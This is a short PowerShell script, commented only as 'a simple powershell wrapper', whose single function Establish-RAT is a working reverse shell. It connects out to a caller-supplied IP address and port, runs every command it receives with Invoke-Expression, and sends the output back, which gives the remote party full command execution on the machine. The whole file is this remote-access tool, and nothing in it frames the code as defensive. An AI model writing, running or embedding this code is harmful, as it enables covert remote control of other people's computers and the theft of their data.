# A simple powershell wrapper

function Establish-RAT 
{
    Param 
    (
        [Parameter(mandatory=$true, Position=0)]
        [string] $ip_addr,
        [Parameter(mandatory=$true, Position=1)]
        [int] $port

    )
    $socket = New-Object System.Net.Sockets.TcpClient($ip_addr, $port)
    $stream = $socket.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object System.Byte[] 1024
    $encoding = New-Object System.Text.ASCIIEncoding
    $writer.AutoFlush = $true

    while($true)
    {
        while($stream.DataAvailable)
        {
            $read = $stream.Read($buffer, 0, 1024)
            $remote_command = ($encoding.GetString($buffer, 0, $read))
            if ($remote_command)
            {
                try
                {
                    $return = Invoke-Expression -Command $remote_command
                }
                catch [Exception]
                {
                    $return = "Invalid Command"
                }
            }
            foreach($item in $return)
            {
            $writer.WriteLine($item)
            }
        }

    }
    if($writer){$writer.Close()}
    if($stream){$stream.Close()}
}
